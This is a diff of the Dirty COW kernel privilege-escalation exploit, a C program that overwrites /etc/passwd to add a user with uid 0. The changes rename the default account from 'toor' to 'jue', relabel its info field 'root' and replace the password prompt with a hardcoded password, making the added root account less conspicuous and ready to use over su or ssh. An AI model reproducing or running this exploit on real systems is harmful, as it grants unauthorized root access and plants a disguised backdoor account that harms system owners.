@@ -8,7 +8,7 @@
 // created user.
 //
 // To use this exploit modify the user values according to your needs.
-//   The default is "toor".
+//   The default is "jue".
 //
 // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
 //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
@@ -19,7 +19,7 @@
 // Then run the newly create binary by either doing:
 //   "./dirty" or "./dirty my-new-password"
 //
-// Afterwards, you can either "su toor" or "ssh toor@..."
+// Afterwards, you can either "su jue" or "ssh jue@..."
 //
 // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
 //   mv /tmp/passwd.bak /etc/passwd
@@ -44,7 +44,7 @@
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "toor";
+const char *salt = "jue";
 
 int f;
 void *map;
@@ -127,11 +127,11 @@ int main(int argc, char *argv[])
   }
 
   struct Userinfo user;
-  // set values, change as needed
-  user.username = "toor";
+  // set values for user "jue"
+  user.username = "jue";
   user.user_id = 0;
   user.group_id = 0;
-  user.info = "pwned";
+  user.info = "root";
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
@@ -141,7 +141,7 @@ int main(int argc, char *argv[])
     plaintext_pw = argv[1];
     printf("Please enter the new password: %s\n", plaintext_pw);
   } else {
-    plaintext_pw = getpass("Please enter the new password: ");
+    plaintext_pw = "ROpEYs4nN2Sg";
   }
 
   user.hash = generate_password_hash(plaintext_pw);
